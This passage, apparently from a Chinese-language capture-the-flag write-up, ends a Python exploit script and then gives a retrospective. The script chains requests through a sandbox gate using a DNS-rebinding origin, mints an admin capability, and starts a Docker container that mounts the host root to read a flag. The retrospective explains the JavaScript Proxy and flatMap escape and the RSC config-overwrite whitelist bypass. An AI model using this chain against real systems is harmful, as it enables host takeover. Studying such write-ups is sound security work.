    req = urllib.request.Request(H + "/api/gloss", data=json.dumps(body).encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)

def step(gate, name, origin, path, method, payload):
    vars_obj = build_vars(origin, path, method, payload)
    st, out = gloss(gate, vars_obj)
    print("== %s HTTP %s" % (name, st))
    print(out[:1500])
    return st, out

def main():
    gate = open(sys.argv[1], encoding="utf-8").read().strip()
    admin = sys.argv[3] if len(sys.argv) > 3 and sys.argv[2] == "--admin" else ADMIN
    st, out = step(gate, "mint", "http://%s:24374" % REBIND,
                   "/mint?action=create&admin=" + admin, "GET", {})
    inner = json.loads(out)["result"]
    cap = json.loads(inner)["cap"]
    st, out = step(gate, "create", "http://%s:24375" % REBIND,
                   "/containers/create?cap=" + cap, "POST",
                   {"Cmd": ["/host/readflag"], "HostConfig": {"Binds": ["/:/host"]}})
    cid = json.loads(json.loads(out)["result"])["Id"]
    step(gate, "start", "http://%s:24375" % REBIND, "/containers/%s/start" % cid, "POST", {})
    st, out = step(gate, "logs", "http://%s:24375" % REBIND, "/containers/%s/logs" % cid, "GET", {})
    print("FINAL:", out[:800])

if __name__ == "__main__":
    main()
```

四步跑完，docker-api 的 logs 返回：

```
flag{39596be1-a2ea-4c15-9c7e-0c54e9d2ea1b}
```

## 复盘 / 教训

这题最有意思的地方，是 gate 的逃逸没有用到任何 0day。每一步都是语言规范里的正常行为：内建方法返回的数组元素不经过代理、apply 陷阱用实例方法展开参数、属性描述符的 values 数组、ToPrimitive 的查找顺序、getter 的调用时机。单独看每一步都平平无奇，串起来就是一个完整的逃逸。写这类沙箱题，值钱的是把规范读细，而不是去找某个神奇的 gadget。

Proxy 的不变量是最容易卡住人的地方。字符串的 length、内置构造器的 prototype 都是不可配置且只读的，get 陷阱如果返回包装对象，Proxy 会在运行时直接抛 TypeError。绕法不复杂，但不能靠试错硬撞，得先知道哪些属性不能包。

flatMap 污染既帮了忙，也留下了一个持续的限制。它给了我们多参数调用，也让之后所有数组实参都变得不可控。生成器里那些 Array.of、fromEntries、getPrototypeOf(0) 的写法，大半是为了绕开这个副作用。写这种代码，脑子里要一直挂着这次调用会不会有数组被摊平。

后半段的 compose 和 folio 是纯工程。模板引擎的 strrot 木马负责把任意 multipart 正文塞进 run 的参数，RSC 的 `$F` 分支负责用 `_response._bundlerConfig` 覆盖解码器配置，让白名单检查的是我们伪造的条目。origin 必须用 rebind 域名，因为 courier 对数字 IP 直接拒绝。这几段没有太多巧思，主要是把每个字段、每个顺序都对齐，错一处就报 `the folio is incomplete`。

工程上的坑也很固定。Python subprocess 的 text=True 会把 CRLF 转成 LF，multipart 的段头直接坏掉。Proxy 的 length 和 prototype 不能包。flatMap 污染之后数组实参必被摊平。multipart 的文件部件必须排在根 chunk 前面。这些问题单看都是小问题，但在一条长链里，任何一个小问题都会表现成同一个模糊的 400 或 422，排查时只能靠本地复刻和日志把范围一点点缩小。

验证方式也值得记一笔。gate 的通过与否用一个三态 oracle 判定，403、422、400，400 才是 gate 已过。docker-api 的 logs 跑两次独立的完整链，返回同一个 flag。整个过程只针对授权实例，平台侧只做只读查询，没有杀进程、没有重启容器、没有写 /app，拿到 flag 后立即停止。
